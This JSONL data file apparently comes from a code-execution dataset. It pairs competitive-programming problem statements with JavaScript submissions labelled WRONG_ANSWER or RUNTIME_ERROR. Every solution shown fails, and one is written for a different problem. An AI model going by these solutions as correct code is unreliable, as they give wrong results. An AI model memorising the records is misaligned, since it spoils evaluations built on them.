{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"172_A","submission_id":"119334917","tags":["*special","brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"let i = ''\nprocess.stdin.on('data', c => i += c)\nprocess.stdin.on('end', () => {\n    const {EOL} = require('os')\n    const lines = i.split(EOL);\n    solve(lines);    \n});\n\nfunction solve(lines){ \n\n    const [ n, ...phoneNumbers ] = lines;\n    let result = phoneNumbers[0].length;\n    for(let i = 1; i < n-1; i++ ) {\n        for(let j = 0; j <= result - 1; j++ ){\n            if(phoneNumbers[i].charAt(j) !== phoneNumbers[i+1].charAt(j)) {\n                result = j;\n                break;\n            }\n        }\n    }\n    console.log(result);\n}","description":"Polycarpus has n friends in Tarasov city. Polycarpus knows phone numbers of all his friends: they are strings s1,s2,...,sn. All these strings consist only of digits and have the same length. Once Polycarpus needed to figure out Tarasov city phone code. He assumed that the phone code of the city is the longest common prefix of all phone numbers of his friends. In other words, it is the longest string c which is a prefix (the beginning) of each si for all i (1\u2264i\u2264n). Help Polycarpus determine the length of the city phone code. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains an integer n (2\u2264n\u22643\u00b710^4) \u2014 the number of Polycarpus's friends. The following n lines contain strings s1,s2,...,sn \u2014 the phone numbers of Polycarpus's friends. It is guaranteed that all strings consist only of digits and have the same length from 1 to 20, inclusive. It is also guaranteed that all strings are different.\n","output_spec":"Print the number of digits in the city phone code.\n","notes":"A prefix of string t is a string that is obtained by deleting zero or more digits from the end of string t. For example, string \"00209\" has 6 prefixes: \"\" (an empty prefix), \"0\", \"00\", \"002\", \"0020\", \"00209\".\nIn the first sample the city phone code is string \"00\".\nIn the second sample the city phone code is an empty string.\nIn the third sample the city phone code is string \"770123456789\".\n","sample_inputs":["4\n00209\n00219\n00999\n00909\n","2\n1\n2\n","3\n77012345678999999999\n77012345678901234567\n77012345678998765432\n"],"sample_outputs":["2\n","0\n","12\n"]}
{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"22_A","submission_id":"149037272","tags":["brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"let i = '';\nprocess.stdin.on('data', c => i += c);\nprocess.stdin.on('end', () => {\n    const {EOL} = require('os');\n    const lines = i.split(EOL);\n    var n = lines[0];\n    var k = lines[1].split(' ').map(Number).sort(function(a, b){return a - b});\n    var a = [];\n    for(var j = 1; j <= n; j++){\n        if(k[j] != k[j - 1]){\n            a.push(k[j - 1]);\n        }\n    }\n    if(n == 1){\n        console.log('NO')\n    }else{\n    console.log(a[1])\n    }\n});","description":"Once Bob needed to find the second order statistics of a sequence of integer numbers. Lets choose each number from the sequence exactly once and sort them. The value on the second position is the second order statistics of the given sequence. In other words it is the smallest element strictly greater than the minimum. Help Bob solve this problem.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2264n\u2264100) \u2014 amount of numbers in the sequence. The second line contains n space-separated integer numbers \u2014 elements of the sequence. These numbers don't exceed 100 in absolute value.\n","output_spec":"If the given sequence has the second order statistics, output this order statistics, otherwise output NO.\n","notes":null,"sample_inputs":["4\n1 2 2 -4\n","5\n1 2 3 1 1\n"],"sample_outputs":["1\n","2\n"]}
{"difficulty":1500,"lang":"Node.js","lang_cluster":"javascript","src_uid":"22_B","submission_id":"177955545","tags":["brute+force","dp"],"exec_outcome":"WRONG_ANSWER","source_code":"const fs = require('fs');\r\nconst input = fs.readFileSync(0, 'utf8').trim().split(\/[\\n\\r]+\/);\r\nconst log = (...args) => console.log(...args);\r\n\r\nlet count = 0;\r\nconst readnum = () => input[count++].trim().split(' ').map(a => +a);\r\nconst readword = () => input[count++].trim().split(' ');\r\n\r\nlet [N,M] = readnum();\r\nlet mat = [];\r\nfor (let i=0; i<N; i++)\r\n  mat.push(readword().join());\r\n\r\nconsole.log(solve(mat));\r\n\r\nfunction solve(matrix) {\r\n  let R = matrix.length, C = matrix[0].length;\r\n  let res = 0;\r\n  let cnt = Array(C).fill(0);\r\n  \r\n  for (let r=0; r<R; r++) {\r\n    let row = matrix[r];\r\n    for (let c=0; c<C; c++) {\r\n      if (row[c] == '1') {\r\n        cnt[c] = 0;\r\n      } else {\r\n          cnt[c] += 1;\r\n  }\r\n  }\r\n    \r\n    let stack = [-1];\r\n  \r\n    for (let i = 0; i < cnt.length; i++) {\r\n      let cur = cnt[i];\r\n  \r\n      while (stack.length > 1 && cur < cnt[stack[stack.length-1]]) {\r\n          let lastIdx = stack.pop(), lastCnt = cnt[lastIdx];\r\n        \r\n        res = Math.max(res, 2 * (lastCnt + (i - 1 - stack[stack.length-1]))); \r\n          }\r\n  \r\n          stack.push(i);\r\n    }\r\n  \r\n    while (stack.length > 1) {\r\n      let lastIdx = stack.pop(), lastCnt = cnt[lastIdx];\r\n        \r\n      res = Math.max(res, 2 * (lastCnt + (cnt.length - 1 - stack[stack.length-1])));\r\n    }\r\n  }\r\n  \r\n  return res;\r\n};\r\n","description":"Bob wants to put a new bargaining table in his office. To do so he measured the office room thoroughly and drew its plan: Bob's office room is a rectangular room n\u00d7m meters. Each square meter of the room is either occupied by some furniture, or free. A bargaining table is rectangular, and should be placed so, that its sides are parallel to the office walls. Bob doesn't want to change or rearrange anything, that's why all the squares that will be occupied by the table should be initially free. Bob wants the new table to sit as many people as possible, thus its perimeter should be maximal. Help Bob find out the maximum possible perimeter of a bargaining table for his office.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains 2 space-separated numbers n and m (1\u2264n,m\u226425) \u2014 the office room dimensions. Then there follow n lines with m characters 0 or 1 each. 0 stands for a free square meter of the office room. 1 stands for an occupied square meter. It's guaranteed that at least one square meter in the room is free.\n","output_spec":"Output one number \u2014 the maximum possible perimeter of a bargaining table for Bob's office room.\n","notes":null,"sample_inputs":["3 3\n000\n010\n000\n","5 4\n1100\n0000\n0000\n0000\n0000\n"],"sample_outputs":["8\n","16\n"]}
{"difficulty":1400,"lang":"Node.js","lang_cluster":"javascript","src_uid":"26_B","submission_id":"179009256","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"const fs = require('fs');\nconst input = fs.readFileSync(0, 'utf8').trim().split(\/[\\n\\r]+\/);\nconst log = (...args) => console.log(...args);\n\nlet count = 0;\nconst readnum = () => input[count++].trim().split(' ').map(a => +a);\nconst readword = () => input[count++].trim().split(' ');\n\nlet str = readword()[0];\nconsole.log(solve(str));\n\nfunction solve(str) {\n  function f(str, par) {\n    let cur = 0, bal = 0, max = 0;\n    for (let ch of str) {\n      cur++;\n\n      if (ch == par) {\n        bal++;\n      } else {\n        bal--;\n      } \n\n      if (bal == 0)\n        max = Math.max(cur, max);\n\n      if (bal < 0) {\n        bal = 0;\n        cur = 0;\n      }  \n    }\n\n    return max;\n  }\n\n  return Math.max(f(str, '('), f([...str].reverse().join(''), ')'));\n}\n","description":"A bracket sequence is called regular if it is possible to obtain correct arithmetic expression by inserting characters \u00ab+\u00bb and \u00ab1\u00bb into this sequence. For example, sequences \u00ab(())()\u00bb, \u00ab()\u00bb and \u00ab(()(()))\u00bb are regular, while \u00ab)(\u00bb, \u00ab(()\u00bb and \u00ab(()))(\u00bb are not.One day Johnny got bracket sequence. He decided to remove some of the brackets from it in order to obtain a regular bracket sequence. What is the maximum length of a regular bracket sequence which can be obtained?","input_from":"standard input","output_to":"standard output","input_spec":"Input consists of a single line with non-empty string of \u00ab(\u00bb and \u00ab)\u00bb characters. Its length does not exceed 10^6.\n","output_spec":"Output the maximum possible length of a regular bracket sequence.\n","notes":null,"sample_inputs":["(()))(\n","((()())\n"],"sample_outputs":["4\n","6\n"]}
{"difficulty":1200,"lang":"Node.js","lang_cluster":"javascript","src_uid":"33_A","submission_id":"184608014","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\"use strict\";\r\nprocess.stdin.resume();\r\nprocess.stdin.setEncoding(\"utf-8\");\r\n \r\nfunction print(x) {\r\n  console.log(x);\r\n}\r\nlet inputString = \"\";\r\nlet currentLine = 0;\r\n \r\nprocess.stdin.on(\"data\", (inputStdin) => {\r\n  inputString += inputStdin;\r\n});\r\nprocess.stdin.on(\"end\", () => {\r\n  inputString = inputString.split(\"\\n\");\r\n  main();\r\n});\r\nfunction readline() {\r\n  return inputString[currentLine++];\r\n}\r\n \r\n\/\/ ********** Code Start **********\r\n\r\nfunction main() {\r\nvar word = readline()\r\nvar output\r\n\r\nif (isNaN(Number(word))) {\r\n    var wordLength = word.length\r\n    if (wordLength >= 10) {\r\n        output = `${word[0]}${wordLength - 2}${word[wordLength - 1]}`\r\n    } else {\r\n        output = word\r\n    }\r\n}\r\nconsole.log(output)\r\n\r\n\r\n}\r\n\r\n\r\n","description":"In one little known, but very beautiful country called Waterland, lives a lovely shark Valerie. Like all the sharks, she has several rows of teeth, and feeds on crucians. One of Valerie's distinguishing features is that while eating one crucian she uses only one row of her teeth, the rest of the teeth are \"relaxing\".For a long time our heroine had been searching the sea for crucians, but a great misfortune happened. Her teeth started to ache, and she had to see the local dentist, lobster Ashot. As a professional, Ashot quickly relieved Valerie from her toothache. Moreover, he managed to determine the cause of Valerie's developing caries (for what he was later nicknamed Cap).It turned that Valerie eats too many crucians. To help Valerie avoid further reoccurrence of toothache, Ashot found for each Valerie's tooth its residual viability. Residual viability of a tooth is a value equal to the amount of crucians that Valerie can eat with this tooth. Every time Valerie eats a crucian, viability of all the teeth used for it will decrease by one. When the viability of at least one tooth becomes negative, the shark will have to see the dentist again. Unhappy, Valerie came back home, where a portion of crucians was waiting for her. For sure, the shark couldn't say no to her favourite meal, but she had no desire to go back to the dentist. That's why she decided to eat the maximum amount of crucians from the portion but so that the viability of no tooth becomes negative. As Valerie is not good at mathematics, she asked you to help her to find out the total amount of crucians that she can consume for dinner.We should remind you that while eating one crucian Valerie uses exactly one row of teeth and the viability of each tooth from this row decreases by one.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, m, k (1\u2264m\u2264n\u22641000,0\u2264k\u226410^6) \u2014 total amount of Valerie's teeth, amount of tooth rows and amount of crucians in Valerie's portion for dinner. Then follow n lines, each containing two integers: r (1\u2264r\u2264m) \u2014 index of the row, where belongs the corresponding tooth, and c (0\u2264c\u226410^6) \u2014 its residual viability.\nIt's guaranteed that each tooth row has positive amount of teeth.\n","output_spec":"In the first line output the maximum amount of crucians that Valerie can consume for dinner.\n","notes":null,"sample_inputs":["4 3 18\n2 3\n1 2\n3 6\n2 3\n","2 2 13\n1 13\n2 12\n"],"sample_outputs":["11\n","13\n"]}
{"difficulty":1400,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"38_C","submission_id":"51331456","tags":["brute+force"],"exec_outcome":"RUNTIME_ERROR","source_code":"var max=0;\r\nvar temp=0;\r\nvar arr = readline().split(' ');\r\nvar n=arr[0];\r\nvar l=arr[1];\r\nvar stripes=readline().split(' ');\r\nvar ans = [];\r\nfor (var i = 0; i < n; i++){\r\n               if (max < stripes[i]){\r\n                   max = stripes[i];}\r\n}\r\n                   for (var i = l; i <= max; i++)\r\n                               {\r\n                         for (var j = 0; j < n; j++)\r\n                       {\r\n                               temp += parseInt(stripes[j] \/ i);\r\n                       }\r\n                         ans.push(temp * i);\r\n                         temp = 0;\r\n                         }\r\n       for (var i = 0; i < ans.lenght; i++)\r\n           if (max < ans[i])\r\n           max = ans[i];\r\n\r\n           if (max > l)\r\n           print(max);\r\n           else\r\n           print(0);","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u00d7d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2264n,l\u2264100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2264ai\u2264100).\n","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.\n","notes":"In the first sample test the required window is 2\u00d74 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts is the initial stripe with the length of 2, the other one is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.\n","sample_inputs":["4 2\n1 2 3 4\n","5 3\n5 5 7 3 1\n","2 3\n1 2\n"],"sample_outputs":["8\n","15\n","0\n"]}
{"difficulty":1100,"lang":"Node.js","lang_cluster":"javascript","src_uid":"46_B","submission_id":"156017370","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"const readline = require('readline');\r\nconst { stdin: input, stdout: output } = require('process');\r\nconst { parse } = require('path');\r\n\r\nconst rl = readline.createInterface({ input, output });\r\n\r\nlet i = 0, n = 0, myMap = new Map();\r\n\r\nrl.on('line', (input) => {\r\n   if (i == 0) {\r\n      let arr = input.split(' ').map(it => parseInt(it));\r\n      myMap.set('S', arr[0]);\r\n      myMap.set('M', arr[1]);\r\n      myMap.set('L', arr[2]);\r\n      myMap.set('XL', arr[3]);\r\n      myMap.set('XXL', arr[4]);\r\n      i++;\r\n   }\r\n   else if (i == 1) {\r\n      n = parseInt(input)\r\n      i++;\r\n   }\r\n   else {\r\n      switch (input) {\r\n         case 'S':\r\n            if (myMap.get('S') > 0) {\r\n               console.log('S');\r\n               myMap.set('S', myMap.get('S') - 1);\r\n            }\r\n            else if (myMap.get('M') > 0) {\r\n               console.log('M');\r\n               myMap.set('M', myMap.get('M') - 1);\r\n            }\r\n            else if (myMap.get('L') > 0) {\r\n               console.log('L');\r\n               myMap.set('L', myMap.get('L') - 1);\r\n            }\r\n            else if (myMap.get('XL') > 0) {\r\n               console.log('XL');\r\n               myMap.set('XL', myMap.get('XL') - 1);\r\n            }\r\n            else {\r\n               console.log('XXL');\r\n               myMap.set('XXL', myMap.get('XXL') - 1);\r\n            }\r\n            break;\r\n         case 'M':\r\n            if (myMap.get('M') > 0) {\r\n               console.log('M');\r\n               myMap.set('M', myMap.get('M') - 1);\r\n            }\r\n            else if (myMap.get('L') > 0) {\r\n               console.log('L');\r\n               myMap.set('L', myMap.get('L') - 1);\r\n            }\r\n            else if (myMap.get('S') > 0) {\r\n               console.log('S');\r\n               myMap.set('S', myMap.get('S') - 1);\r\n            }\r\n            else if (myMap.get('XL') > 0) {\r\n               console.log('XL');\r\n               myMap.set('XL', myMap.get('L') - 1);\r\n            }\r\n            else {\r\n               console.log('XXL');\r\n               myMap.set('XXL', myMap.get('XXL') - 1);\r\n            }\r\n            break;\r\n         case 'L':\r\n            if (myMap.get('L') > 0) {\r\n               console.log('L');\r\n               myMap.set('L', myMap.get('L') - 1);\r\n            }\r\n            else if (myMap.get('XL') > 0) {\r\n               console.log('XL');\r\n               myMap.set('XL', myMap.get('XL') - 1);\r\n            }\r\n            else if (myMap.get('M') > 0) {\r\n               console.log('M');\r\n               myMap.set('M', myMap.get('M') - 1);\r\n            }\r\n            else if (myMap.get('XXL') > 0) {\r\n               console.log('XXL');\r\n               myMap.set('XXL', myMap.get('XXL') - 1);\r\n            }\r\n            else {\r\n               console.log('S');\r\n               myMap.set('S', myMap.get('S') - 1);\r\n            }\r\n           break;\r\n         case 'XL':\r\n            if (myMap.get('XL') > 0) {\r\n               console.log('XL');\r\n               myMap.set('XL', myMap.get('XL') - 1);\r\n            }\r\n            else if (myMap.get('XXL') > 0) {\r\n               console.log('XXL');\r\n               myMap.set('XXL', myMap.get('XXL') - 1);\r\n            }\r\n            else if (myMap.get('L') > 0) {\r\n               console.log('L');\r\n               myMap.set('L', myMap.get('L') - 1);\r\n            }\r\n            else if (myMap.get('M') > 0) {\r\n               console.log('M');\r\n               myMap.set('M', myMap.get('M') - 1);\r\n            }\r\n            else {\r\n               console.log('S');\r\n               myMap.set('S', myMap.get('S') - 1);\r\n            }\r\n           break;\r\n         default:\r\n            if (myMap.get('XXL') > 0) {\r\n               console.log('XXL');\r\n               myMap.set('XXL', myMap.get('XXL') - 1);\r\n            }\r\n            else if (myMap.get('XL') > 0) {\r\n               console.log('XL');\r\n               myMap.set('XL', myMap.get('XL') - 1);\r\n            }\r\n            else if (myMap.get('L') > 0) {\r\n               console.log('L');\r\n               myMap.set('L', myMap.get('L') - 1);\r\n            }\r\n            else if (myMap.get('M') > 0) {\r\n               console.log('M');\r\n               myMap.set('M', myMap.get('M') - 1);\r\n            }\r\n            else {\r\n               console.log('S');\r\n               myMap.set('S', myMap.get('S') - 1);\r\n            }\r\n           break; \r\n\r\n      }\r\n   }\r\n\r\n});","description":"One day a well-known sponsor of a well-known contest decided to give every participant of the contest a T-shirt as a present. A natural problem occurred: on the one hand, it is not clear how many T-shirts of what sizes should be ordered, and on the other hand, one doesn't want to order too many T-shirts (and we do not exactly paper the walls with the oversupply). After considerable brain racking and some pre-estimating, the sponsor representatives ordered a certain number of T-shirts of sizes S, M, L, XL and XXL. The T-shirts turned out to bring good luck, that's why on the contest day there built up a line of K participants willing to get one. Every contestant is characterized by his\/her desired T-shirt size (so it happens that for all the participants it is also one of the sizes S, M, L, XL and XXL). The participants come up to get a T-shirt one by one and try to choose the most suitable one, choosing it like this. If there is still a T-shirt of the optimal size left, that he\/she takes it without further ado. Otherwise the contestant would prefer to choose a T-shirt with the size as close to the optimal one as possible (the distance between neighboring sizes is considered equal to one). If the variant of choice is not unique, the contestant will take a T-shirt of a bigger size (in case he\/she grows more). For example, for a person whose optimal size is L the preference list looks like this: L, XL, M, XXL, S. Using the data on how many T-shirts of every size had been ordered by the organizers, on the size of contestants in the line determine who got a T-shirt of what size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains five non-negative integers NS,NM,NL,NXL,NXXL not exceeding 1000 which represent the number of T-shirts of the corresponding sizes. The second line contains an integer K (1\u2264K\u22641000) which represents the number of participants. The next K lines contain the optimal T-shirt sizes for the contestants. The sizes are given in the order in which the participants stand in the line. It is guaranteed that NS+NM+NL+NXL+NXXL\u2265K.\n","output_spec":"For each contestant, print a line containing the size of the T-shirt he\/she got.\n","notes":null,"sample_inputs":["1 0 2 0 1\n3\nXL\nXXL\nM\n"],"sample_outputs":["XXL\nL\nL\n"]}
{"difficulty":1200,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"48_B","submission_id":"17930601","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"var getArr = function() {\r\n\treturn readline().split(' ').map(function (a) {\r\n\t\treturn parseInt(a);\r\n\t})\r\n};\r\n\r\nvar getTree = function(arr, x, y, a, b) {\r\n\tvar res = 0;\r\n\tfor (var i = 0; i < a; i++) {\r\n\t\tfor (var j = 0; j < b; j++) {\r\n\t\t\tres += arr[x + i][y + j];\r\n\t\t}\r\n\t}\r\n\treturn res;\r\n};\r\n\r\nvar data = [];\r\nvar input;\r\n\r\ninput = getArr();\r\nvar m = input[0];\r\nvar n = input[1];\r\nfor (var k = 0; k < m; k++) {\r\n\tdata.push(getArr());\r\n}\r\ninput = getArr();\r\nvar a = input[0];\r\nvar b = input[1];\r\n\r\nvar min = getTree(data, 0, 0, a, b);\r\nfor (var i = 0; i < m - a + 1; i++) {\r\n\tfor (var j = 0; j < n - b + 1; j++) {\r\n\t\tmin = Math.min(min, getTree(data, i, j, a, b));\r\n\t}\r\n}\r\n\r\nprint(min);","description":"Vasya has a beautiful garden where wonderful fruit trees grow and yield fantastic harvest every year. But lately thieves started to sneak into the garden at nights and steal the fruit too often. Vasya can\u2019t spend the nights in the garden and guard the fruit because there\u2019s no house in the garden! Vasya had been saving in for some time and finally he decided to build the house. The rest is simple: he should choose in which part of the garden to build the house. In the evening he sat at his table and drew the garden\u2019s plan. On the plan the garden is represented as a rectangular checkered field n\u00d7m in size divided into squares whose side length is 1. In some squares Vasya marked the trees growing there (one shouldn\u2019t plant the trees too close to each other that\u2019s why one square contains no more than one tree). Vasya wants to find a rectangular land lot a\u00d7b squares in size to build a house on, at that the land lot border should go along the lines of the grid that separates the squares. All the trees that grow on the building lot will have to be chopped off. Vasya loves his garden very much, so help him choose the building land lot location so that the number of chopped trees would be as little as possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2264n,m\u226450) which represent the garden location. The next n lines contain m numbers 0 or 1, which describe the garden on the scheme. The zero means that a tree doesn\u2019t grow on this square and the 1 means that there is a growing tree. The last line contains two integers a and b (1\u2264a,b\u226450). Note that Vasya can choose for building an a\u00d7b rectangle as well a b\u00d7a one, i.e. the side of the lot with the length of a can be located as parallel to the garden side with the length of n, as well as parallel to the garden side with the length of m.\n","output_spec":"Print the minimum number of trees that needs to be chopped off to select a land lot a\u00d7b in size to build a house on. It is guaranteed that at least one lot location can always be found, i. e. either a\u2264n and b\u2264m, or a\u2264m \u0438 b\u2264n.\n","notes":"In the second example the upper left square is (1,1) and the lower right is (3,2).\n","sample_inputs":["2 2\n1 0\n1 1\n1 1\n","4 5\n0 0 1 0 1\n0 1 1 1 0\n1 0 1 0 1\n1 1 1 1 1\n2 3\n"],"sample_outputs":["0\n","2\n"]}
{"difficulty":1300,"lang":"Node.js","lang_cluster":"javascript","src_uid":"56_B","submission_id":"107280238","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"const readline = require('readline').createInterface({\r\n  input: process.stdin,\r\n  output: process.stdout\r\n});\r\nlet i = 0;\r\nlet orginal = [];\r\nlet swapped = [];\r\nreadline.on('line', line => {\r\n  i++;\r\n  if (i === 1) {\r\n    orginal = [...Array(parseInt(line)).keys()];\r\n    orginal.splice(0, 1);\r\n  }\r\n  else {\r\n    readline.close();\r\n    swapped = line.split(' ').map((x) => {\r\n      return parseInt(x);\r\n    });\r\n    difference = orginal.reduce((list, coin, index) => {\r\n      if (coin !== swapped[index]) {\r\n        list.push(coin)\r\n      }\r\n      return list\r\n    }, []);\r\n    if (difference.length === 0) {\r\n      console.log(0, 0)\r\n    } else {\r\n      const firstIndex = orginal.indexOf(difference[0]);\r\n      const lastIndex = orginal.indexOf(difference[difference.length - 1]);\r\n      const originalPart = orginal.slice(firstIndex, lastIndex + 1)\r\n      const reversedPart = swapped.slice(firstIndex, lastIndex + 1); \r\n      if (isEqual(originalPart, reversedPart.reverse())) {\r\n        console.log(difference[0], difference[difference.length - 1])\r\n      } else {\r\n        console.log(0, 0)\r\n      }\r\n    }\r\n\r\n  }\r\n});\r\n\r\nfunction isEqual(a, b) \r\n{ \r\n  \/\/ if length is not equal \r\n  if(a.length!=b.length) \r\n   return false; \r\n  else\r\n  { \r\n  \/\/ comapring each element of array \r\n    return a.reduce((value, e, index) => {\r\n      if (e === b[index]) {\r\n        value = true\r\n        return value\r\n      }\r\n      value = false\r\n      return value\r\n    }, false)\r\n  } \r\n}","description":"Vasya collects coins: he has exactly one coin for every year from 1 to n. Naturally, Vasya keeps all the coins in his collection in the order in which they were released. Once Vasya's younger brother made a change \u2014 he took all the coins whose release year dated from l to r inclusively and put them in the reverse order. That is, he took a certain segment [l,r] and reversed it. At that the segment's endpoints did not coincide. For example, if n=8, then initially Vasya's coins were kept in the order 1 2 3 4 5 6 7 8. If Vasya's younger brother chose the segment [2,6], then after the reversal the coin order will change to 1 6 5 4 3 2 7 8. Vasya suspects that someone else could have spoilt the permutation after his brother. Help him to find that out. Check if the given permutation can be obtained from the permutation 1 2 ... n using exactly one segment reversal. If it is possible, find the segment itself.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u22641000) which is the number of coins in Vasya's collection. The second line contains space-separated n integers which are the spoilt sequence of coins. It is guaranteed that the given sequence is a permutation, i.e. it contains only integers from 1 to n, and every number is used exactly 1 time.\n","output_spec":"If it is impossible to obtain the given permutation from the original one in exactly one action, print 0 0. Otherwise, print two numbers l r (1\u2264l<r\u2264n) which are the endpoints of the segment that needs to be reversed to obtain from permutation 1 2 ... n the given one.\n","notes":null,"sample_inputs":["8\n1 6 5 4 3 2 7 8\n","4\n2 3 4 1\n","4\n1 2 3 4\n"],"sample_outputs":["2 6\n","0 0\n","0 0\n"]}
{"difficulty":1200,"lang":"Node.js","lang_cluster":"javascript","src_uid":"59_B","submission_id":"158622642","tags":["implementation","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"const readline = require('readline');\r\nconst { stdin: input, stdout: output } = require('process');\r\n\r\nconst rl = readline.createInterface({ input, output });\r\n\r\nlet n = -1, arr = [];\r\n\r\nrl.on('line', (input) => {\r\n    if (n == -1)\r\n        n = parseInt(input);\r\n    else {\r\n        arr = input.split(' ').map(it => parseInt(it));\r\n        let sum = 0, minOdd = 101;\r\n        arr.forEach(lm => {\r\n            if (lm % 2 != 0 && lm < minOdd)\r\n                minOdd = lm;\r\n            sum += lm;\r\n        });\r\n        if (n == 1 && sum % 2 != 0)\r\n            console.log(sum);\r\n        else if (n == 1)\r\n            console.log(0);\r\n        else if (sum % 2 == 0)\r\n            console.log(sum - minOdd)\r\n        else\r\n            console.log(sum)\r\n\r\n        rl.close()\r\n    }\r\n})\r\n","description":"Marina loves Sasha. But she keeps wondering whether Sasha loves her. Of course, the best way to know it is fortune telling. There are many ways of telling fortune, but Marina has picked the easiest one. She takes in her hand one or several camomiles and tears off the petals one by one. After each petal she pronounces alternatively \"Loves\" and \"Doesn't love\", at that Marina always starts with \"Loves\". There are n camomiles growing in the field, possessing the numbers of petals equal to a1,a2,... an. Marina wants to pick a bouquet with the maximal possible total number of petals so that the result would still be \"Loves\". Help her do that; find the maximal number of petals possible in the bouquet.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u2264100), which is the number of flowers growing in the field. The second line contains n integers ai (1\u2264ai\u2264100) which represent the number of petals on a given i-th camomile.\n","output_spec":"Print a single number which is the maximal number of petals in the bouquet, the fortune telling on which would result in \"Loves\". If there are no such bouquet, print 0 instead. The bouquet may consist of a single flower.\n","notes":null,"sample_inputs":["1\n1\n","1\n2\n","3\n5 6 7\n"],"sample_outputs":["1\n","0\n","13\n"]}
{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"5ebfad36e56d30c58945c5800139b880","submission_id":"8de28e585aa66bbb82b4a1c985e7a98a","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"const readline = require('readline');\nconst rl = readline.createInterface({\n  input: process.stdin,\n  output: process.stdout,\n  terminal: false\n});\nlet c = 0;\nconst arr = [];\n\nrl.on('line', (d) => {\n  if (c === 0) {\n    c++;\n    return;\n  }\n\n  arr.push(d.split(' ').map(Number));\n\n  c++;\n});\n\nrl.on('close', () => {\n  let ans = 0;\n\n  for (let i = 0; i < arr.length; i++) {\n    for (let j = 0; j < arr.length; j++) {\n      ans += arr[i][j];\n    }\n  }\n\n  if (arr.length > 3) {\n    ans -= arr[0][1];\n    ans -= arr[0][arr.length - 2];\n    ans -= arr[arr.length - 1][1];\n    ans -= arr[arr.length - 1][arr.length - 2];\n    ans -= arr[1][0];\n    ans -= arr[1][arr.length - 1];\n    ans -= arr[arr.length - 2][0];\n    ans -= arr[arr.length - 2][arr.length - 1];\n  }\n\n  console.log(ans);\n});\n","description":"The Smart Beaver from ABBYY got hooked on square matrices. Now he is busy studying an n\u2009\u00d7\u2009n size matrix, where n is odd. The Smart Beaver considers the following matrix elements good:    Elements of the main diagonal.   Elements of the secondary diagonal.   Elements of the \"middle\" row \u2014 the row which has exactly  rows above it and the same number of rows below it.   Elements of the \"middle\" column \u2014 the column that has exactly  columns to the left of it and the same number of columns to the right of it.    The figure shows a 5\u2009\u00d7\u20095 matrix.   The good elements are marked with green.  Help the Smart Beaver count the sum of good elements of the given matrix.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input data contains a single odd integer n. Each of the next n lines contains n integers aij (0\u2009\u2264\u2009aij\u2009\u2264\u2009100) separated by single spaces \u2014 the elements of the given matrix. The input limitations for getting 30 points are:    1\u2009\u2264\u2009n\u2009\u2264\u20095  The input limitations for getting 100 points are:   1\u2009\u2264\u2009n\u2009\u2264\u2009101 ","output_spec":"Print a single integer \u2014 the sum of good matrix elements.","notes":"NoteIn the first sample all matrix elements will be good. Good elements in the second sample are shown on the figure.","sample_inputs":["3\n1 2 3\n4 5 6\n7 8 9","5\n1 1 1 1 1\n1 1 1 1 1\n1 1 1 1 1\n1 1 1 1 1\n1 1 1 1 1"],"sample_outputs":["45","17"]}
